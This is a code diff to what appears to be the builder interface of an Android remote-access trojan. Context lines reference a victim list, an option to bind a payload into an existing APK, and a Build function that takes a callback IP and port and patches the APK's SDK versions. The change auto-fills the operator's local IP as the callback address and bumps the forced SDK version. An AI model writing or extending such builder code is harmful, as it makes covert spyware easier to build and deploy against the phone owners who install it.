@@ -20,6 +20,7 @@ const {
 const exec = promisify(require('child_process').exec);
 var xml2js = require('xml2js');
 var readdirp = require('readdirp');
+const os = require('os');
 //--------------------------------------------------------------
 var viclist = {};
 var dataPath = dir.join(homedir(), CONSTANTS.dataDir);
@@ -38,6 +39,37 @@ app.controller("AppCtrl", ($scope) => {
     $appCtrl.bindApk = {
         enable: false, method: 'BOOT'
     }; //default values for binding apk
+
+    $appCtrl.useLocalIP = true; // Default to using local IP
+    $appCtrl.localIP = ''; // To store the detected local IP
+
+    // Function to toggle the srcIP input field based on useLocalIP checkbox
+    $appCtrl.toggleIpInput = () => {
+        if ($appCtrl.useLocalIP) {
+            $appCtrl.srcIP = $appCtrl.localIP; // Set IP to local if checkbox is checked
+        } else {
+            $appCtrl.srcIP = ''; // Clear IP if checkbox is unchecked
+        }
+    };
+
+    // Ensure initial state of srcIP input is correct based on useLocalIP
+    $appCtrl.toggleIpInput();
+
+    // Get local IP address when the controller initializes
+    (function getLocalIP() {
+        const interfaces = os.networkInterfaces();
+        for (const devName in interfaces) {
+            const iface = interfaces[devName];
+            for (let i = 0; i < iface.length; i++) {
+                const alias = iface[i];
+                if (alias.family === 'IPv4' && alias.address !== '127.0.0.1' && !alias.internal) {
+                    $appCtrl.localIP = alias.address;
+                    $appCtrl.srcIP = alias.address; // Set initial IP to local IP
+                    return;
+                }
+            }
+        }
+    })();
 
     var log = document.getElementById("log");
 
@@ -859,9 +891,9 @@ app.controller("AppCtrl", ($scope) => {
                                             var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                                             var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/;
 
-                                            var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"')
+                                            var repXmlSdk = data.replace(compSdkVerRegex, "$1" + "24" + '"')
                                                 .replace(compSdkVerNameRegex, "$111" + '"')
-                                                .replace(platVerCoRegex, "$122" + '"')
+                                                .replace(platVerCoRegex, "$1" + "24" + '"')
                                                 .replace(platVerNameRegex, "$111" + '"');
 
                                             fs.writeFile(dir.join(apkFolder, 'AndroidManifest.xml'), repXmlSdk, 'utf8', (error) => {
@@ -886,7 +918,7 @@ app.controller("AppCtrl", ($scope) => {
                                                     var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
 
                                                     var repYmlSdk = data.replace(minSdkRegex, "$119'")
-                                                        .replace(tarSdkRegex, "$122'");
+                                                        .replace(tarSdkRegex, "$1" + "24'");
 
                                                     fs.writeFile(dir.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                                         if (error) {
@@ -914,6 +946,13 @@ app.controller("AppCtrl", ($scope) => {
     // fired when user click build buttom
     // collect the ip and port and start building
     $appCtrl.Build = (ip, port) => {
+        // If 'useLocalIP' is checked and 'ip' is empty, use the detected local IP
+        if ($appCtrl.useLocalIP && (!ip || ip.trim() === '')) {
+            ip = $appCtrl.localIP; // Use the automatically detected local IP
+            $appCtrl.srcIP = ip; // Update the input field as well
+            $appCtrl.Log('[¡] Using local IP address: ' + ip, CONSTANTS.logStatus.INFO);
+        }
+
         // Check Java version before proceeding
         checkJavaVersion((error, javaVersion) => {
             if (error) {
